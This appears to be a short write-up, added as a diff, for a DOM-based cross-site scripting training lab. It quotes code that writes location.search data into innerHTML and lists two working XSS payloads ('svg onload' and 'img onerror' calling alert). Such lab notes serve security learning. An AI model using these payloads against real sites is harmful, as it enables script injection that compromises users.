@@ -1,0 +1,16 @@
+This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.
+
+To solve this lab, perform a cross-site scripting attack that calls the alert function.
+
+function doSearchQuery(query) {
+    document.getElementById('searchMessage').innerHTML = query;
+}
+var query = (new URLSearchParams(window.location.search)).get('search');
+if(query) {
+    doSearchQuery(query);
+}
+
+<span id="searchMessage"><svg onload="alert(1)"></svg></span>
+
+payload1: <svg onload=alert(1)>
+payload2: <img src=1 onerror=alert(1)>
